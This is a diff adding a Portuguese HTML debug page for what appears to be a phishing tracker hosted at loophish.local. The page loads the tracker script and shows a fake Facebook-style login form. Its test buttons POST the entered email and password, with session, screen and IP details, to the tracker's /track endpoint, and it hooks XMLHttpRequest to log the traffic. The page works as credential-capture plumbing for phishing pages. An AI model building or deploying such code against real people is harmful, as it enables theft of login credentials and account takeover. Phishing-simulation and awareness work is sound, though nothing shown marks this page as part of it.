@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🧪 Teste DEBUG - Tracking de Dados</title>
+    <script src="https://loophish.local/mod?tlink=daxn8c" type="text/javascript"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #f0f2f5;
+        }
+        .debug-panel {
+            background: white;
+            border: 2px solid #007bff;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        .success { border-color: #28a745; background: #d4edda; }
+        .error { border-color: #dc3545; background: #f8d7da; }
+        .warning { border-color: #ffc107; background: #fff3cd; }
+        
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+            font-weight: bold;
+        }
+        .btn-primary { background: #007bff; color: white; }
+        .btn-success { background: #28a745; color: white; }
+        .btn-danger { background: #dc3545; color: white; }
+        
+        .code-block {
+            background: #2d3748;
+            color: #e2e8f0;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 14px;
+            overflow-x: auto;
+            margin: 10px 0;
+        }
+        
+        #real-time-log {
+            height: 300px;
+            overflow-y: auto;
+            border: 1px solid #ccc;
+            padding: 10px;
+            background: #f8f9fa;
+        }
+    </style>
+</head>
+<body>
+    <h1>🧪 Teste DEBUG - Verificação de Tracking</h1>
+    
+    <div class="debug-panel">
+        <h3>📊 Status do Tracker</h3>
+        <div id="tracker-status">Aguardando carregamento...</div>
+    </div>
+
+    <div class="debug-panel">
+        <h3>🚀 Testes de Envio Manual</h3>
+        <p>Use estes botões para forçar o envio de dados para o servidor:</p>
+        
+        <button class="btn btn-primary" onclick="testPageVisit()">📄 Testar Page Visit (Page 0)</button>
+        <button class="btn btn-success" onclick="testFormSubmit()">📝 Testar Form Submit (Page 1)</button>
+        <button class="btn btn-danger" onclick="testDirectAPI()">🔧 Testar API Diretamente</button>
+    </div>
+
+    <div class="debug-panel">
+        <h3>📝 Formulário de Teste (Simula Facebook)</h3>
+        <form id="test-form">
+            <label>Email: <input type="email" id="email" value="teste@exemplo.com" style="padding: 8px; width: 200px;"></label><br><br>
+            <label>Senha: <input type="password" id="senha" value="senha123" style="padding: 8px; width: 200px;"></label><br><br>
+            <button type="submit" id="entrar" class="btn btn-success">🚀 Login (Tracker Ativo)</button>
+        </form>
+    </div>
+
+    <div class="debug-panel">
+        <h3>📡 Log de Requisições em Tempo Real</h3>
+        <div id="real-time-log">Aguardando atividade...<br></div>
+        <button class="btn btn-primary" onclick="clearLog()">🧹 Limpar Log</button>
+    </div>
+
+    <div class="debug-panel">
+        <h3>🔍 Informações de Debug</h3>
+        <div class="code-block" id="debug-info">Carregando...</div>
+    </div>
+
+    <script>
+        let logContainer = document.getElementById('real-time-log');
+        let statusContainer = document.getElementById('tracker-status');
+        let debugContainer = document.getElementById('debug-info');
+
+        function addLog(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const colors = {
+                'info': '#007bff',
+                'success': '#28a745',
+                'error': '#dc3545',
+                'warning': '#ffc107'
+            };
+            logContainer.innerHTML += `<span style="color: ${colors[type]}; font-weight: bold;">[${timestamp}] ${message}</span><br>`;
+            logContainer.scrollTop = logContainer.scrollHeight;
+            console.log(`[TRACKER DEBUG] ${message}`);
+        }
+
+        function clearLog() {
+            logContainer.innerHTML = 'Log limpo.<br>';
+        }
+
+        function updateStatus() {
+            try {
+                const ridValue = typeof rid !== 'undefined' ? (rid || '(string vazia)') : 'UNDEFINED';
+                const trackerValue = typeof tracker_id !== 'undefined' ? tracker_id : 'UNDEFINED';
+                const sessValue = typeof sess_id !== 'undefined' ? sess_id : 'UNDEFINED';
+                
+                if (typeof rid !== 'undefined' && typeof tracker_id !== 'undefined') {
+                    statusContainer.innerHTML = `
+                        <div style="color: #28a745; font-weight: bold;">✅ TRACKER CARREGADO COM SUCESSO!</div>
+                        <p><strong>RID:</strong> ${ridValue}</p>
+                        <p><strong>Tracker ID:</strong> ${trackerValue}</p>
+                        <p><strong>Session ID:</strong> ${sessValue}</p>
+                    `;
+                    statusContainer.parentElement.className = 'debug-panel success';
+                } else {
+                    statusContainer.innerHTML = `
+                        <div style="color: #dc3545; font-weight: bold;">❌ ERRO NO TRACKER</div>
+                        <p>Tracker não foi carregado corretamente.</p>
+                    `;
+                    statusContainer.parentElement.className = 'debug-panel error';
+                }
+
+                debugContainer.innerHTML = `
+URL: ${window.location.href}
+Search: ${window.location.search || '(vazio)'}
+RID: ${ridValue}
+Tracker ID: ${trackerValue}
+Session ID: ${sessValue}
+IP Info: ${typeof ip_info !== 'undefined' ? 'Carregado' : 'Aguardando...'}
+User Agent: ${navigator.userAgent}
+Screen: ${screen.width}x${screen.height}
+                `;
+                
+            } catch (e) {
+                addLog(`Erro ao atualizar status: ${e.message}`, 'error');
+            }
+        }
+
+        // Interceptar XMLHttpRequest para monitorar requisições
+        const originalSend = XMLHttpRequest.prototype.send;
+        const originalOpen = XMLHttpRequest.prototype.open;
+        
+        XMLHttpRequest.prototype.open = function(method, url, async) {
+            this._method = method;
+            this._url = url;
+            addLog(`🔗 OPENING: ${method} ${url}`, 'info');
+            return originalOpen.call(this, method, url, async);
+        };
+
+        XMLHttpRequest.prototype.send = function(data) {
+            const self = this;
+            
+            // Log do envio
+            if (this._url && this._url.includes('/track')) {
+                addLog(`📡 ENVIANDO para /track:`, 'warning');
+                try {
+                    const parsedData = JSON.parse(data);
+                    addLog(`   📊 Dados: ${JSON.stringify(parsedData, null, 2)}`, 'info');
+                } catch (e) {
+                    addLog(`   📊 Dados (raw): ${data}`, 'info');
+                }
+            }
+            
+            // Interceptar resposta
+            this.addEventListener('readystatechange', function() {
+                if (this.readyState === 4) {
+                    if (self._url && self._url.includes('/track')) {
+                        if (this.status === 200) {
+                            addLog(`✅ RESPOSTA: ${this.responseText}`, 'success');
+                        } else {
+                            addLog(`❌ ERRO HTTP ${this.status}: ${this.responseText}`, 'error');
+                        }
+                    }
+                }
+            });
+            
+            return originalSend.call(this, data);
+        };
+
+        // Funções de teste manual
+        function testPageVisit() {
+            addLog('🧪 TESTE MANUAL: Page Visit...', 'warning');
+            if (typeof do_track_req_visit === 'function') {
+                do_track_req_visit();
+            } else {
+                // Envio manual se a função não existir
+                sendManualRequest({
+                    page: 0,
+                    trackerId: typeof tracker_id !== 'undefined' ? tracker_id : 'daxn8c',
+                    sess_id: typeof sess_id !== 'undefined' ? sess_id : 'manual_test',
+                    screen_res: screen.width + "x" + screen.height,
+                    rid: typeof rid !== 'undefined' ? rid : '',
+                    ip_info: typeof ip_info !== 'undefined' ? ip_info : null
+                });
+            }
+        }
+
+        function testFormSubmit() {
+            addLog('🧪 TESTE MANUAL: Form Submit...', 'warning');
+            const formData = {
+                email: document.getElementById('email').value,
+                senha: document.getElementById('senha').value
+            };
+            
+            sendManualRequest({
+                page: 1,
+                trackerId: typeof tracker_id !== 'undefined' ? tracker_id : 'daxn8c',
+                sess_id: typeof sess_id !== 'undefined' ? sess_id : 'manual_test',
+                screen_res: screen.width + "x" + screen.height,
+                form_field_data: formData,
+                rid: typeof rid !== 'undefined' ? rid : '',
+                ip_info: typeof ip_info !== 'undefined' ? ip_info : null
+            });
+        }
+
+        function testDirectAPI() {
+            addLog('🧪 TESTE DIRETO: Enviando via fetch...', 'warning');
+            
+            fetch('https://loophish.local/track', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    page: 0,
+                    trackerId: 'daxn8c',
+                    sess_id: 'direct_test_' + Date.now(),
+                    screen_res: screen.width + "x" + screen.height,
+                    rid: new URLSearchParams(window.location.search).get('rid') || '',
+                    ip_info: null
+                })
+            })
+            .then(response => response.text())
+            .then(data => {
+                addLog(`✅ FETCH RESPONSE: ${data}`, 'success');
+            })
+            .catch(error => {
+                addLog(`❌ FETCH ERROR: ${error}`, 'error');
+            });
+        }
+
+        function sendManualRequest(data) {
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://loophish.local/track", true);
+            xhr.send(JSON.stringify(data));
+        }
+
+        // Inicialização
+        setTimeout(() => {
+            addLog('🚀 Página carregada, verificando tracker...', 'info');
+            updateStatus();
+            
+            // Atualizar status a cada 2 segundos
+            setInterval(updateStatus, 2000);
+            
+        }, 1000);
+
+        // Log inicial
+        addLog(`📍 URL: ${window.location.href}`, 'info');
+        addLog(`🔗 RID Parameter: ${new URLSearchParams(window.location.search).get('rid') || '(não encontrado)'}`, 'info');
+    </script>
+</body>
+</html>
